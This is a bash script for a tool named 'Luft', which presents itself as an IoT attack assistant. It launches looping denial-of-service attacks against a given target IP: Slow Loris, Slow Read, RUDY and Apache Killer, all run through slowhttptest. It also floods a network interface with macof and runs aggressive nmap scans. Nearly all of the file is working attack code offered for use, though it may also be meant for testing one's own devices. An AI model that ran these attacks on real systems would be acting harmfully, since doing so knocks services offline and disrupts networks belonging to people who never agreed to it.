#!/bin/bash

# Color Codes
RED="\e[0;31m"
BLUE="\e[0;94m"
BLUE_BG="\033[0;37;44m"
RED_BG="\033[0;37;41m"
GREEN_BG="\e[0;102m"
GREEN="\e[0;32m"
BROWN="\e[0;33m"
WHITE="\e[0;97m"
BOLD="\e[1m"
ULINE="\e[4m"
RESET="\e[0m"

VERSION="1.0.0"

help() {
    cat << "EOF"
    __          ______ 
   / /   __  __/ __/ /_
  / /   / / / / /_/ __/
 / /___/ /_/ / __/ /_  
/_____/\__,_/_/  \__/  
                                                       
EOF

    echo -e "${GREEN}Luft${RESET} version ${BROWN}$VERSION${RESET} $(date +'%Y-%m-%d %H:%m:%S')"
    echo -e "\n${BROWN}Usage:${RESET}\n  luft [options] [arguments]"
    echo -e "\n${BROWN}Arguments:${RESET}"
    echo -e "  ${GREEN}-h, --help${RESET}\t\t\t Display help for the given command. When no command is given display help for the ${GREEN}list${RESET} command"
    echo -e "  ${GREEN}-t, --target${RESET}\t\t\t Assigns the target victim to perform the attack. The IP address should be given"
    echo -e "  ${GREEN}-i, --interface${RESET}\t\t Assigns the target interface to perform the attack. Only available in the MACOF attack"
    echo -e "  ${GREEN}-l, --loop${RESET}\t\t\t Loops the attack for a specified number of times"
    echo -e "\n${BROWN}Available options:${RESET}"
    echo -e "  ${GREEN}slowloris${RESET}\t\t\t Performs the Slow Loris attack"
    echo -e "  ${GREEN}slowread${RESET}\t\t\t Performs the Slow Read attack"
    echo -e "  ${GREEN}rudy${RESET}\t\t\t\t Performs the R-U-Dead-Yeat attack"
    echo -e "  ${GREEN}apachekiller${RESET}\t\t\t Performs the Apache Killer attack"
    echo -e "  ${GREEN}macof${RESET}\t\t\t\t Performs the MACOF attack"
    echo -e "  ${GREEN}netscan${RESET}\t\t\t Performs the Network Scanning attack"
    echo -e "\n${BROWN}Other options:${RESET}"
    echo -e "  ${GREEN}about${RESET}\t\t\t\t Shows a short information about Luft"
    echo -e "  ${GREEN}list${RESET}\t\t\t\t List all the commands and usefull Luft"
}

about() {
    echo -e "${GREEN}Luft - IoT Attack Assistant - version $VERSION${RESET}"
    echo -e "${BROWN}Luft is a tool designed to assist adversaries to attack their IoT environments.${RESET}"
    echo -e "${BROWN}See https://github.com/joseareia/luft for more information."
}

if [[ ! -n "$1" ]]; then
    help
fi

# Options
slowloris_flag=false
slowread_flag=false
rudy_flag=false
apachekiller_flag=false
macof_flag=false
netscan_flag=false

# Arguments
target=""
interface=""
loop=""

# Process options
while [[ $# -gt 0 ]]; do
    case $1 in
        'about')
            about
            ;;
        'list')
            help
            ;;
        --help | -h)
            help
            ;;
        --target | -t)
            shift
            target=$1
            ;;
        --interface | -i)
            shift
            interface=$1
            ;;
        --loop | -l)
            shift
            loop=$1
            ;;
        'slowloris')
            slowloris_flag=true
            ;;
        'rudy')
            rudy_flag=true
            ;;
        'apachekiller')
            apachekiller_flag=true
            ;;
        'slowread')
            slowread_flag=true
            ;;
        'macof')
            macof_flag=true
            ;;
        'netscan')
            netscan_flag=true
            ;;
        *)
            echo -e "\n  ${RED_BG} ERROR ${RESET} The option \"$1\" does not exist. \n" >&2 && exit 1
            ;;
    esac
    shift
done

# Performs the Slow Loris attack: luft slowloris [-t | --target TARGET_IP]
if $slowloris_flag; then
    if [ ! -z "$target" ]; then
        if [ ! "$UID" -eq 0 ]; then
            echo -e "\n  ${RED_BG} ERROR ${RESET} You must run this option with sudo.\n" >&2 ; exit 1
        fi
        
        slowhttptest -H -c 1000 -g -u "$target" &
        error_code=$?

        if [ $error_code -ne 0  ]; then
            echo -ne "\n  ${RED_BG} ERROR ${RESET} There was an error while starting the attack. (Code: $error_code) \r" >&2 ; echo -ne '\n\n' ; exit 1
        else
            if [ ! -z "$loop" ]; then
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Slow Loris attack is performing. Looping: $loop time(s)." >&2 ; echo -ne '\n\n'
            else        
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Slow Loris attack is performing." >&2 ; echo -ne '\n\n'
            fi
        fi
        
        if [ ! -z "$loop" ]; then
            count=0
            while [ $count -lt "$loop" ]; do
                slowhttptest -H -c 1000 -g -u "$target" &
                PID=$!

                while kill -0 "$PID" >/dev/null 2>&1; do
                    sleep 1
                done

                count=$((count + 1))
            done
        fi
    else
        echo -e "\n  ${RED_BG} ERROR ${RESET} You must provide a target to the attack. \n" >&2
        echo -e "  ${GREEN}slowloris [-t | --target TARGET_IP]\n"
        exit 1
    fi
fi

# Performs the RUDY attack: luft rudy [-t | --target TARGET_IP]
if $rudy_flag; then
    if [ ! -z "$target" ]; then
        if [ ! "$UID" -eq 0 ]; then
            echo -e "\n  ${RED_BG} ERROR ${RESET} You must run this option with sudo.\n" >&2 ; exit 1
        fi

        slowhttptest -B -c 1000 -g -u "$target" &
        error_code=$?

        if [ $error_code -ne 0  ]; then
            echo -ne "\n  ${RED_BG} ERROR ${RESET} There was an error while starting the attack. (Code: $error_code) \r" >&2 ; echo -ne '\n\n' ; exit 1
        else
            if [ ! -z "$loop" ]; then
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The RUDY attack is performing. Looping: $loop time(s)." >&2 ; echo -ne '\n\n'
            else        
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The RUDY attack is performing." >&2 ; echo -ne '\n\n'
            fi       
        fi

        if [ ! -z "$loop" ]; then
            count=0
            while [ $count -lt "$loop" ]; do
                slowhttptest -B -c 1000 -g -u "$target" &
                PID=$!

                while kill -0 "$PID" >/dev/null 2>&1; do
                    sleep 1
                done

                count=$((count + 1))
            done
        fi
    else
        echo -e "\n  ${RED_BG} ERROR ${RESET} You must provide a target to the attack. \n" >&2
        echo -e "  ${GREEN}rudy [-t | --target TARGET_IP]\n"
        exit 1
    fi
fi

# Performs the Apache Killer attack: luft apachekiller [-t | --target TARGET_IP]
if $apachekiller_flag; then
    if [ ! -z "$target" ]; then
        if [ ! "$UID" -eq 0 ]; then
            echo -e "\n  ${RED_BG} ERROR ${RESET} You must run this option with sudo.\n" >&2 ; exit 1
        fi

        slowhttptest -R -c 1000 -g -u "$target" &
        error_code=$?

        if [ $error_code -ne 0  ]; then
            echo -ne "\n  ${RED_BG} ERROR ${RESET} There was an error while starting the attack. (Code: $error_code) \r" >&2 ; echo -ne '\n\n' ; exit 1
        else
            if [ ! -z "$loop" ]; then
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Apache Killer attack is performing. Looping: $loop time(s)." >&2 ; echo -ne '\n\n'
            else        
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Apache Killer attack is performing." >&2 ; echo -ne '\n\n'
            fi       
        fi

        if [ ! -z "$loop" ]; then
            count=0
            while [ $count -lt "$loop" ]; do
                slowhttptest -R -c 1000 -g -u "$target" &
                PID=$!

                while kill -0 "$PID" >/dev/null 2>&1; do
                    sleep 1
                done

                count=$((count + 1))
            done
        fi
    else
        echo -e "\n  ${RED_BG} ERROR ${RESET} You must provide a target to the attack. \n" >&2
        echo -e "  ${GREEN}apachekiller [-t | --target TARGET_IP]\n"
        exit 1
    fi
fi

# Performs the Slow Read attack: luft slowread [-t | --target TARGET_IP]
if $slowread_flag; then
    if [ ! -z "$target" ]; then
        if [ ! "$UID" -eq 0 ]; then
            echo -e "\n  ${RED_BG} ERROR ${RESET} You must run this option with sudo.\n" >&2 ; exit 1
        fi

        slowhttptest -X -c 1000 -g -u "$target" &
        error_code=$?

        if [ $error_code -ne 0  ]; then
            echo -ne "\n  ${RED_BG} ERROR ${RESET} There was an error while starting the attack. (Code: $error_code) \r" >&2 ; echo -ne '\n\n' ; exit 1
        else
            if [ ! -z "$loop" ]; then
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Slow Read attack is performing. Looping: $loop time(s)." >&2 ; echo -ne '\n\n'
            else        
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Slow Read attack is performing." >&2 ; echo -ne '\n\n'
            fi        
        fi

        if [ ! -z "$loop" ]; then
            count=0
            while [ $count -lt "$loop" ]; do
                slowhttptest -X -c 1000 -g -u "$target" &
                PID=$!

                while kill -0 "$PID" >/dev/null 2>&1; do
                    sleep 1
                done

                count=$((count + 1))
            done
        fi
    else
        echo -e "\n  ${RED_BG} ERROR ${RESET} You must provide a target to the attack. \n" >&2
        echo -e "  ${GREEN}slowread [-t | --target TARGET_IP]\n"
        exit 1
    fi
fi

# Performs the MACOF attack: luft macof [-i | --interface TARGET_INTERFACE]
if $macof_flag; then
    if [ ! -z "$interface" ]; then
        if [ ! "$UID" -eq 0 ]; then
            echo -e "\n  ${RED_BG} ERROR ${RESET} You must run this option with sudo.\n" >&2 ; exit 1
        fi

        macof -i "$interface" -n 15 &
        error_code=$?

        if [ $error_code -ne 0  ]; then
            echo -ne "\n  ${RED_BG} ERROR ${RESET} There was an error while starting the attack. (Code: $error_code) \r" >&2 ; echo -ne '\n\n' ; exit 1
        else
            if [ ! -z "$loop" ]; then
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The MACOF attack is performing. Looping: $loop time(s)." >&2 ; echo -ne '\n\n'
            else        
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The MACOF attack is performing." >&2 ; echo -ne '\n\n'
            fi        
        fi

        if [ ! -z "$loop" ]; then
            count=0
            while [ $count -lt "$loop" ]; do
                macof -i "$interface" -n 15 &
                PID=$!

                while kill -0 "$PID" >/dev/null 2>&1; do
                    sleep 1
                done

                count=$((count + 1))
            done
        fi
    else
        echo -e "\n  ${RED_BG} ERROR ${RESET} You must provide an interface for this attack. \n" >&2
        echo -e "  ${GREEN}macof [-i | --interface TARGET_INTERFACE]\n"
        exit 1
    fi
fi

# Performs the Slow Read attack: luft netscan [-t | --target TARGET_IP]
if $netscan_flag; then
    if [ ! -z "$target" ]; then
        if [ ! "$UID" -eq 0 ]; then
            echo -e "\n  ${RED_BG} ERROR ${RESET} You must run this option with sudo.\n" >&2 ; exit 1
        fi

        nmap -p- -A -T4 -sS -sC -sV -O "$target" &
        error_code=$?

        if [ $error_code -ne 0  ]; then
            echo -ne "\n  ${RED_BG} ERROR ${RESET} There was an error while starting the attack. (Code: $error_code) \r" >&2 ; echo -ne '\n\n' ; exit 1
        else
            if [ ! -z "$loop" ]; then
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Network Scanning attack is performing. Looping: $loop time(s)." >&2 ; echo -ne '\n\n'
            else        
                echo -ne "\n  ${BLUE_BG} INFO ${RESET} The Network Scanning attack is performing." >&2 ; echo -ne '\n\n'
            fi        
        fi

        if [ ! -z "$loop" ]; then
            count=0
            while [ $count -lt "$loop" ]; do
                nmap -p- -A -T4 -sS -sC -sV -O "$target" &
                PID=$!

                while kill -0 "$PID" >/dev/null 2>&1; do
                    sleep 1
                done

                count=$((count + 1))
            done
        fi
    else
        echo -e "\n  ${RED_BG} ERROR ${RESET} You must provide a target to the attack. \n" >&2
        echo -e "  ${GREEN}netscan [-t | --target TARGET_IP]\n"
        exit 1
    fi
fi
